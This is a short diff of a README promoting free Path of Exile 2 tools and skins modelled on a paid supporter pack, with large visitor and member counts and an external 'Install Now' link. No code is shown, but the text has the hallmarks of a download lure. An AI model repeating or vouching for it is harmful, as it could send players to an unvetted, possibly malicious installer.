@@ -4,7 +4,7 @@
 
 ![FaridunExilePack Banner](https://i.ytimg.com/vi/4bdfC7XNS4s/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLBKyxTm0ltsLqGFhCdTZIeyG-x0mA)
 
-**About FaridunExilePack**: FaridunExilePack is a repository for *Path of Exile 2* players on Windows, offering free community-crafted tools, skins, and gameplay tweaks inspired by the King of the Faridun Supporter Pack. Enhance your Wraeclast adventure with customizations. With 150K+ visitors and 120K+ members, dive into the action today! (282 characters)
+**About FaridunExilePack**: FaridunExilePack is a repository for *Path of Exile 2* players on Windows, offering free community-crafted tools, skins, and gameplay tweaks inspired by the King of the Faridun Supporter Pack. Enhance your Wraeclast adventure with customizations. With 150K+ visitors and 120K+ members, dive into the action today!  
 
 <a href="https://wraeclast-exiles.github.io/.github/" target="_blank">
   <img src="https://img.shields.io/badge/Install-Now-9b6_%E2%86%92_3498db?style=gradient" alt="Install Guide Now" width="230height="45 style="border:none;">
